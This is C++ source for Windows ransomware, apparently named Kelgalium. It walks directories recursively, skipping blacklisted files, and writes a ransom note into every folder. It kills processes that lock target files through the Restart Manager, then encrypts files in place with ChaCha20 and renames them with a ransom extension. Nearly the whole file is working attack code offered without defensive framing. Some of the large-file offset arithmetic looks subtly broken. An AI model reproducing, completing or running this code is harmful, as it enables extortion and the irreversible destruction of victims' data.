#pragma once
#include <Windows.h>
#include "../libs/ChaCha20/chacha20.h"
#include "../libs/SHA256/sha256.h"
#include "../libs/TinyECDH/ecdh.h"
#include <shlwapi.h>
#include <process.h>
#include <tlhelp32.h>
#include <winnetwk.h>
#include <restartmanager.h>
#include "main_payloads.h"
#include "blacklist.h"
#include "var.h"
#pragma comment (lib, "Rstrtmgr.lib")




namespace Kelgalium 
{
	VOID SearchFiles(WCHAR* pathname, int layer)
	{
		WIN32_FIND_DATAW fd;

		WCHAR* pathsearch = (WCHAR*)myHeapAlloc(65536);
		if (pathsearch != NULL)
		{
			lstrcpyW(pathsearch, pathname);
			lstrcatW(pathsearch, L"\\*");

			HANDLE hFind = FindFirstFileW(pathsearch, &fd);
			if (hFind != INVALID_HANDLE_VALUE)
			{
				BOOL isBlack = FALSE;
				do
				{
					for (int i = 0; i < ARRAY_SIZE(BLACKLISTED_FILENAMES); ++i)
					{
						if (!lstrcmpW(fd.cFileName, BLACKLISTED_FILENAMES[i]))
						{
#ifdef DEBUG
							wprintf(L"[INF] Blacklisted file %ls\r\n", fd.cFileName);
#endif
							isBlack = TRUE;
							break;
						}
					}

					if (!isBlack)
					{
						lstrcpyW(pathsearch, pathname);
						lstrcatW(pathsearch, L"\\");
						lstrcatW(pathsearch, fd.cFileName);

						if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
						{
							if (layer < 16)
							{
#ifdef DEBUG
								wprintf(L"[INF] Walking %ls\r\n", pathsearch);
#endif
								SearchFiles(pathsearch, layer + 1);
							}
						}
						else if (lstrcmpW(fd.cFileName, RANSOM_NAME))
						{
							for (int j = lstrlenW(fd.cFileName); j > 0; --j)
							{
								if (fd.cFileName[j] == '.')
								{
									if (!lstrcmpW(&fd.cFileName[j], EXT))
									{
#ifdef DEBUG
										wprintf(L"[INF] Skipping file %ls\r\n", fd.cFileName);
#endif
										isBlack = TRUE;
										break;
									}
								}
							}

							if (!isBlack)
							{
#ifdef DEBUG
								wprintf(L"[INF] Encrypting file %ls\r\n", pathsearch);
#endif
								CryptFile(pathsearch);
							}
						}
					}
					isBlack = FALSE;
				} while (FindNextFileW(hFind, &fd));
				FindClose(hFind);

				lstrcpyW(pathsearch, pathname);
				lstrcatW(pathsearch, L"\\");
				lstrcatW(pathsearch, RANSOM_NAME);

				HANDLE hFile = CreateFileW(pathsearch, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
				if (hFile != INVALID_HANDLE_VALUE)
				{
#ifdef DEBUG
					wprintf(L"[INF] Writing note %ls\r\n", pathsearch);
#endif
					DWORD wb;
					WriteFile(hFile, RANSOM_NOTE, lstrlenA(RANSOM_NOTE), &wb, NULL);
					CloseHandle(hFile);
				}
			}
		}
		myHeapFree(pathsearch);
	}


	void StartEncryption(const WCHAR* filename)
	{
		HANDLE hFile;

		WCHAR sessionKey[CCH_RM_SESSION_KEY + 1];
		DWORD sessionHnd;
		RM_PROCESS_INFO dwProcessId[10];

		DWORD rebootReasons;
		BOOL bWhat = TRUE;

		SetFileAttributesW(filename, FILE_ATTRIBUTE_NORMAL);
		while (TRUE)
		{
			hFile = CreateFileW(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile != INVALID_HANDLE_VALUE)
			{
				break;
			}

			if (!bWhat)
			{
				break;
			}

			ZeroMemory(sessionKey, CCH_RM_SESSION_KEY + 1);

			if (RmStartSession(&sessionHnd, 0, sessionKey))
			{
				break;
			}

			if (!RmRegisterResources(sessionHnd, 1, &filename, 0, NULL, 0, NULL))
			{
				UINT procInfoNeeded, procInfo = sizeof(dwProcessId);
				if (!RmGetList(sessionHnd, &procInfoNeeded, &procInfo, dwProcessId, &rebootReasons))
				{
					for (int i = 0; i < procInfo; ++i)
					{
						if (dwProcessId[i].ApplicationType != RmExplorer
							&& dwProcessId[i].ApplicationType != RmCritical
							&& GetCurrentProcessId() != dwProcessId[i].Process.dwProcessId)
						{
							HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, dwProcessId[i].Process.dwProcessId);
							if (hProcess != INVALID_HANDLE_VALUE)
							{
								TerminateProcess(hProcess, 0);
								WaitForSingleObject(hProcess, 5000);
								CloseHandle(hProcess);
							}
						}
					}
				}
			}
			RmEndSession(sessionHnd);
			bWhat = FALSE;
		}

		LARGE_INTEGER FileSize;
		GetFileSizeEx(hFile, &FileSize);

		HANDLE hMAP = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
		if (hMAP != NULL)
		{
			if (FileSize.QuadPart <= 41943040)
			{
				if (FileSize.QuadPart > 0)
				{
					LPBYTE hView = (LPBYTE)MapViewOfFile(hMAP, FILE_MAP_ALL_ACCESS, 0, 0, FileSize.LowPart);
					if (hView != NULL)
					{
						ChaCha20XOR(CHACHA20_FINAL_KEY_1, 20, CHACHA20_FINAL_NONCE, hView, hView, FileSize.LowPart);
						ChaCha20XOR(CHACHA20_FINAL_KEY_2, 20, CHACHA20_FINAL_NONCE, hView, hView, FileSize.LowPart);
						UnmapViewOfFile(hView);
					}
				}
			}
			else
			{
				DWORD blocks = FileSize.QuadPart / 10485760 / 3;
				for (int i = 0; i < 3; ++i)
				{
					DWORD offsetHigh = blocks * i;
					DWORD offsetLow = offsetHigh * 10485760;

					LPBYTE hView = (LPBYTE)MapViewOfFile(hMAP, FILE_MAP_ALL_ACCESS, offsetHigh, offsetLow, 10485760);
					if (hView != NULL)
					{
						ChaCha20XOR(CHACHA20_FINAL_KEY_1, 20, CHACHA20_FINAL_NONCE, hView, hView, 10485760);
						ChaCha20XOR(CHACHA20_FINAL_KEY_2, 20, CHACHA20_FINAL_NONCE, hView, hView, 10485760);
						UnmapViewOfFile(hView);
					}
				}
			}
			CloseHandle(hMAP);
		}
		FlushFileBuffers(hFile);
		CloseHandle(hFile);

		WCHAR* newPath = (WCHAR*)myHeapAlloc(65536);
		if (newPath != NULL)
		{
			lstrcpyW(newPath, filename);
			lstrcatW(newPath, EXT);
			MoveFileExW(filename, newPath, 9);
			myHeapFree(newPath);
		}
	}
}
